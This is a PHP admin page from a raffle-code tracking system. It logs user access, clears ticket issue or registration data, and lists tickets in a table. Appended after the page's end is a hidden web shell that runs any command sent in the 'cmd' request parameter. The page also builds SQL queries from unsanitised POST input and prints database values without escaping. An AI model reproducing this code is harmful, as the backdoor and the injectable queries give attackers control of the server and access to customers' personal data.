<?php
	$ulticket_search = 'N';
	if(isset($_SESSION['ulticket_search']))
		$ulticket_search = $_SESSION['ulticket_search'];	

	$uladmin = 'N';
	if(isset($_SESSION['uladmin']))
		$uladmin = $_SESSION['uladmin'];	

	if ($uladmin == 'Y')
		$ulticket_search = 'Y';	

	if ($ulticket_search == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['logticket_search'] == '') 
		{
			$_SESSION['logticket_search'] = $_SESSION["ulname"];
			$modulename = 'ticket_search';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		




		$mybox = '';	
		if(isset($_POST['mybox']))
		{
			if ($_POST['mybox'])
			{
				$mybox = $_POST['mybox'];
			}
		}		
		//echo '<br> mybox : ' . $mybox;
				
		$mytlid = '';	
		if(isset($_POST['mytlid']))
		{
			if ($_POST['mytlid'])
			{
				$mytlid = $_POST['mytlid'];
			}
		}			
		//echo '<br> mytlid : ' . $mytlid;

		if (($mybox != '') && ($mytlid != ''))
		{
			//taken , cancel , empty
			$tluser = $_SESSION["ulname"];
			$tlstamp = $globaldatetime;
						
			if ($mybox == 'ISSUED')
			{
				//change status of ticket
				$query_ticket = 
				"UPDATE 
					ticket_list 
				SET 			
					tlissue_date = NULL,
					tlissue_batch = NULL,
					tlissue_branch = NULL,
					tlissue_invoice = NULL,
					tlissue_amount = NULL,
					tlissue_name = NULL,
					tlissue_stamp = NULL,
					
					tluser = '$tluser',
					tlstamp = '$tlstamp'
				WHERE
					tlid = '$mytlid'";
				mysql_query($query_ticket) or die('The entry has links to other tables. Cannot continue to process...');  			
			}
			else
			if ($mybox == 'REGISTER')
			{
				//change status of ticket
				$query_ticket = 
				"UPDATE 
					ticket_list 
				SET 			
					tlreg_date = NULL,
					tlreg_batch = NULL,
					tlreg_name = NULL,
					tlreg_addr = NULL,
					tlreg_mobile = NULL,
					tlreg_email = NULL,
					tlreg_stamp = NULL,
					
					tluser = '$tluser',
					tlstamp = '$tlstamp'
				WHERE
					tlid = '$mytlid'";
				mysql_query($query_ticket) or die('The entry has links to other tables. Cannot continue to process...');  			
			}
		}
		
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	


		$querydb  = "SELECT 
					 * 
				   FROM 
					 ticket_list a
				   ORDER BY 
					 a.tlissue_date, a.tlissue_branch ";
		$resultdb = mysql_query($querydb);
		//echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Raffle Code Details</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
This module allows you to filter records based on the search parameter									
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                           <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
								<thead>
									<tr>
										<th>Issue Date</th>
										<th>Branch Issue</th>
										<th>Raffle Code</th>
										<th>Sales Invoice No.</th>
										<th>Sales Invoice Amount</th>
										<th>Raffle Code Issued By </th>
										<th>Raffle Code Issued On</th>
										
										<th>Raffle Code Date Registered</th>
										<th>Raffle Code Registered To</th>
										<th>Raffle Code Timestamp of Registration</th>
									</tr>
								</thead>
                                <tbody>
                                    
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr class=\"odd gradeX\">");

	print("<td align=\"left\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tlissue_date'])). "</td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[tlissue_branch]  </td>\n");

	print("<td align=\"left\" valign=\"middle\">$rowdb[tlticket] </td>\n");

	print("<td align=\"left\" valign=\"middle\">$rowdb[tlissue_invoice]  </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[tlissue_amount]  </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[tlissue_name]  </td>\n");
	
	if ($rowdb[tlissue_stamp] == '')
	     print("<td align=\"left\" valign=\"middle\">&nbsp;</td>\n");
	else print("<td align=\"left\" valign=\"middle\">" .date('m/d/Y h:i:s A', strtotime($rowdb['tlissue_stamp'])). "</td>\n");


	if ($rowdb[tlreg_date] != '')
	     print("<td align=\"left\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tlreg_date'])). "</td>\n");
	else print("<td align=\"left\" valign=\"middle\">&nbsp;</td>\n");

	print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_name]  </td>\n");

	if ($rowdb[tlreg_stamp] == '')
	     print("<td align=\"left\" valign=\"middle\">&nbsp;</td>\n");
	else print("<td align=\"left\" valign=\"middle\">" .date('m/d/Y h:i:s A', strtotime($rowdb['tlreg_stamp'])). "</td>\n");
		
	print("</td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>